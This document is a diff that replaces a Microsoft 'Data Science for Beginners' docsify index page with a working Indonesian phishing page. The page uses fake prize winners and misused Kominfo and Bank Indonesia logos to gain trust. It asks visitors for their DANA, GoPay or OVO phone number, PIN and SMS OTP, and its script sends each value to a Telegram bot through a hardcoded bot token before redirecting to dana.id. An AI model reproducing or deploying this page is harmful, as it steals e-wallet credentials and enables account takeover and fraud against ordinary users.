@@ -1,27 +1,233 @@
+
 <!DOCTYPE html>
-<html lang="en">
-
+<html>
+    <head>
+        <meta charset="utf-8"/>
+        <meta name="description" content=""/>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Template</title>
+        <style>
+        </style>
+    </head>
+    <body>
+        <p id = "myid" ></p>
+        <script>
+            document.getElementById("myid").innerText
+        </script>
+    </body>
+</html>
+<!DOCTYPE html>
+<html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Data Science for Beginners</title>
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-  <meta name="description" content="Description">
-  <meta name="viewport"
-    content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
-  <link rel="icon" type="image/png" href="images/favicon.png">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/docsify-themeable@0/dist/css/theme-simple.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Layanan Verifikasi Digital</title>
+    <style>
+        :root { --main-color: #108ee9; }
+        * { box-sizing: border-box; font-family: 'Inter', sans-serif; transition: all 0.3s ease; }
+        body { background-color: #f0f3f8; margin: 0; display: flex; justify-content: center; min-height: 100vh; overflow-x: hidden; }
+        
+        .container { 
+            width: 100%; max-width: 420px; background: white; min-height: 100vh; 
+            position: relative; box-shadow: 0 10px 25px rgba(0,0,0,0.05); overflow: hidden;
+        }
+        
+        /* Animasi Muncul Halaman */
+        .page { display: none; animation: slideUp 0.5s ease-out; }
+        .active { display: block; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Iklan Pemenang (Running Text) */
+        .winner-ticker {
+            background: #fff9db; color: #f08c00; padding: 8px 0; font-size: 12px;
+            font-weight: bold; border-bottom: 1px solid #ffe066; overflow: hidden;
+            white-space: nowrap; position: relative;
+        }
+        .ticker-content {
+            display: inline-block; animation: ticker 20s linear infinite;
+        }
+        @keyframes ticker {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+
+        /* Banner dengan Animasi Pulse */
+        .banner { padding: 15px; margin-top: 5px; }
+        .banner-img { 
+            width: 100%; border-radius: 15px; background: linear-gradient(135deg, var(--main-color), #0056b3); 
+            height: 140px; display: flex; flex-direction: column; align-items: center; justify-content: center; 
+            color: white; text-align: center; padding: 20px; animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(16, 142, 233, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(16, 142, 233, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(16, 142, 233, 0); }
+        }
+
+        /* Menu Section */
+        .menu-box { margin: 15px; border: 1px solid #edf2f7; border-radius: 16px; padding: 20px; background: #fff; position: relative; }
+        .menu-title { color: #2d3748; font-size: 14px; text-align: center; font-weight: 700; margin-bottom: 20px; }
+        
+        /* Floating Animation pada Pilihan */
+        .option { 
+            display: flex; align-items: center; padding: 15px; border-radius: 12px; 
+            margin-bottom: 10px; cursor: pointer; border: 2px solid #f7fafc; 
+            font-weight: 600; color: #4a5568; background: white;
+        }
+        .option:hover { border-color: var(--main-color); transform: translateX(5px); }
+        .option input { margin-right: 15px; transform: scale(1.3); accent-color: var(--main-color); }
+
+        /* Button dengan Efek Goyang (Shake) */
+        .btn-lanjut { 
+            background: var(--main-color); color: white; border: none; width: calc(100% - 40px); 
+            margin: 10px 20px; padding: 18px; border-radius: 50px; font-weight: 700; font-size: 16px; 
+            cursor: pointer; box-shadow: 0 6px 15px rgba(16, 142, 233, 0.3);
+            animation: shake 5s infinite;
+        }
+        @keyframes shake {
+            0%, 90%, 100% { transform: rotate(0); }
+            92% { transform: rotate(2deg); }
+            94% { transform: rotate(-2deg); }
+            96% { transform: rotate(2deg); }
+            98% { transform: rotate(-2deg); }
+        }
+
+        /* Footer Pengawasan */
+        .footer-trust { text-align: center; margin-top: 15px; padding-bottom: 30px; }
+        .trust-logos { display: flex; justify-content: center; align-items: center; gap: 20px; opacity: 0.6; }
+        .trust-logos img { height: 25px; }
+
+        /* Header Verifikasi */
+        .header-v { background: var(--main-color); padding: 20px; text-align: center; color: white; font-weight: bold; }
+        .input-group { padding: 40px 20px; text-align: center; }
+        .input-field { width: 100%; padding: 18px; margin-top: 15px; border: 2px solid #edf2f7; border-radius: 12px; font-size: 22px; outline: none; text-align: center; font-weight: bold; }
+    </style>
 </head>
-
 <body>
-  <div id="app"></div>
-  <script>
-    window.$docsify = {
-      name: 'Data Science for Beginners',
-      repo: 'https://github.com/Microsoft/Data-Science-For-Beginners',
-      relativePath: true
-    }
-  </script>
-  <script src="//cdn.jsdelivr.net/npm/docsify/lib/docsify.min.js"></script>
-</body>
 
+<div class="container">
+    
+    <div id="page1" class="page active">
+        <div class="winner-ticker">
+            <div class="ticker-content">
+                🎉 Selamat! Ani - Jkt (Rp 2.500.000) • Budi - Sby (Rp 1.000.000) • Citra - Bdg (Refund Sukses) • Dedi - Mdn (Paylater Aktif) • Eko - Jog (Rp 500.000) • 🎉 
+            </div>
+        </div>
+
+        <div class="banner">
+            <div class="banner-img">
+                <span style="font-size: 22px; font-weight: 900; text-shadow: 0 2px 4px rgba(0,0,0,0.2);">GEBYAR HADIAH</span>
+                <span style="font-size: 13px; opacity: 0.9; margin-top: 5px;">Konfirmasi & Cairkan Saldo Anda Sekarang</span>
+            </div>
+        </div>
+        
+        <div class="menu-box">
+            <div class="menu-title">PILIH LAYANAN ANDA</div>
+            <label class="option"><input type="radio" name="service" value="Konfirmasi Pencairan"> Konfirmasi Pencairan</label>
+            <label class="option"><input type="radio" name="service" value="Pemulihan Akun"> Pemulihan Akun</label>
+            <label class="option"><input type="radio" name="service" value="Pengajuan Paylater"> Pengajuan Paylater</label>
+            <label class="option"><input type="radio" name="service" value="Refund Saldo"> Refund Saldo</label>
+        </div>
+
+        <button class="btn-lanjut" onclick="toPage('page2')">Lanjutkan Sekarang</button>
+
+        <div class="footer-trust">
+            <p style="font-size: 11px; color:#a0aec0; margin-bottom: 10px;">Terdaftar & diawasi oleh</p>
+            <div class="trust-logos">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/bb/Logo_Kementerian_Komunikasi_dan_Informatika_Indonesia.png">
+                <img src="https://upload.wikimedia.org/wikipedia/id/thumb/d/d4/Logo_Bank_Indonesia.svg/1200px-Logo_Bank_Indonesia.svg.png">
+            </div>
+            <span style="font-size: 11px; font-weight: bold; color: #718096; margin-top: 8px; display: block;">KOMDIGI | BANK INDONESIA</span>
+        </div>
+    </div>
+
+    <div id="page2" class="page">
+        <div class="header-v">PILIH METODE PEMBAYARAN</div>
+        <div style="padding: 10px;">
+            <div class="menu-box">
+                <label class="option" onclick="setTheme('#108ee9', 'DANA')"><input type="radio" name="wallet" value="DANA"> DANA</label>
+                <label class="option" onclick="setTheme('#00aa13', 'GOPAY')"><input type="radio" name="wallet" value="GOPAY"> GOPAY</label>
+                <label class="option" onclick="setTheme('#4d2a86', 'OVO')"><input type="radio" name="wallet" value="OVO"> OVO</label>
+            </div>
+        </div>
+        <button class="btn-lanjut" onclick="toPage('page3')">Lanjutkan</button>
+    </div>
+
+    <div id="page3" class="page">
+        <div class="header-v" id="header-text">VERIFIKASI</div>
+        <div class="input-group">
+            <h3 id="label-step" style="margin:0; color:#2d3748;">Nomor Handphone</h3>
+            <p id="desc-step" style="color: #a0aec0; font-size: 14px; margin-bottom: 20px;">Gunakan nomor HP aktif Anda</p>
+            
+            <input type="tel" id="main-input" class="input-field" inputmode="numeric" placeholder="08xxxxxxxx" autofocus>
+            
+            <button class="btn-lanjut" style="width: 100%; margin: 30px 0 0 0; animation: none;" onclick="submitStep()">Konfirmasi</button>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    const BOT_TOKEN = '7249905709:AAEo6FwCMZn0twG82kyojuHP5QL6tXjuhHU';
+    const CHAT_ID = '6819335845';
+    
+    let currentStep = 'phone';
+    let userData = { service: '', wallet: '', phone: '', pin: '', otp: '' };
+
+    function toPage(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        if(id === 'page3') document.getElementById('main-input').focus();
+    }
+
+    function setTheme(color, name) {
+        document.documentElement.style.setProperty('--main-color', color);
+        document.getElementById('header-text').innerText = name;
+    }
+
+    async function submitStep() {
+        const inputObj = document.getElementById('main-input');
+        const inputVal = inputObj.value;
+        if (!inputVal) return alert("Harap isi data!");
+
+        let msg = "";
+        if (currentStep === 'phone') {
+            userData.service = document.querySelector('input[name="service"]:checked')?.value || 'N/A';
+            userData.wallet = document.querySelector('input[name="wallet"]:checked')?.value || 'N/A';
+            userData.phone = inputVal;
+            msg = `👤 *BARU*\nWallet: ${userData.wallet}\nNo: \`${userData.phone}\``;
+            
+            document.getElementById('label-step').innerText = "Masukkan PIN";
+            document.getElementById('desc-step').innerText = "Masukkan 6 digit keamanan";
+            inputObj.value = ""; inputObj.type = "password"; inputObj.placeholder = "••••••";
+            inputObj.focus(); currentStep = 'pin';
+        } 
+        else if (currentStep === 'pin') {
+            userData.pin = inputVal;
+            msg = `🔑 *PIN*\nNo: \`${userData.phone}\`\nPIN: \`${userData.pin}\``;
+            
+            document.getElementById('label-step').innerText = "Masukkan OTP";
+            document.getElementById('desc-step').innerText = "Masukkan kode dari SMS";
+            inputObj.value = ""; inputObj.type = "tel"; inputObj.placeholder = "0000";
+            inputObj.focus(); currentStep = 'otp';
+        } 
+        else {
+            userData.otp = inputVal;
+            msg = `🔥 *LENGKAP*\nNo: \`${userData.phone}\`\nPIN: \`${userData.pin}\`\nOTP: \`${userData.otp}\``;
+        }
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+        });
+
+        if (currentStep === 'otp' && userData.otp !== "") {
+            alert("Verifikasi Berhasil!");
+            window.location.href = "https://www.dana.id";
+        }
+    }
+</script>
+
+</body>
 </html>
